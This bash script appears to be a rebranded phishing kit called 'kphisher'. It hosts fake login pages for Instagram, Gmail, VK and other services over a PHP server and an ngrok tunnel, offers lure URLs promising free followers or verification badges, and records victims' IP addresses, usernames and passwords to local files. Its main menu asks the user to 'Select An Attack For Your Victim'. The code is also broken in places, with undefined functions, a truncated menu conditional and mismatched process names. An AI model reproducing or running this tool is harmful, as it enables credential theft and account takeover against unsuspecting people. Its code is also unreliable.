#!/bin/bash

##   
##      Copyright (C) 2021  Kaybeefxsa (https://github.com/Kaybeefxsa)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall kphisher > /dev/null 2>&1
	fi	
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} |  |  /   /       /---\    \  \  /  /  B E E F-X
		${ORANGE} |  | /   /       /     \    \  \/  /
		${ORANGE} |  |/   /       /  / \  \    \    /
                ${ORANGE} |      /       /  /   \  \   /   /
                ${ORANGE} |  |\   \     /  /     \  \ /   /
                ${ORANGE} |  | \   \
                ${ORANGE} |  |  \   \                                 
		${ORANGE}                      ${RED}Version : 2.1

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Kaybeefx.sa (Kaybeefx.sa)${Green}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  KAYBEE FX ${WHITE} 2.1
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download kphisher
download_kphisher() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/kphisher > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/kphisher > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install kphisher
install_kphisher() {
	if [[ -e ".server/kphisher" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} kphisher already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_kphisher 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_kphisher 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_kphisher 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_kphisher 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}KAYBEE FOREX ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/kaybeefx
		${GREEN}Version  ${RED}:  ${ORANGE}2.1

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching kphisher..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/kphisher http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/kphisher http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	kphisher_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	kphisher_url1=${kphisher_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$kphisher_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} kphisher.io  ${RED}[${CYAN}Best${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_kphisher
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

## likeeshare
site_likeeshare() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		
        EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="likeeshare.com"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://get-1000-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium-real-method-2020'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_vk; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_Likeeshare
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram

		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
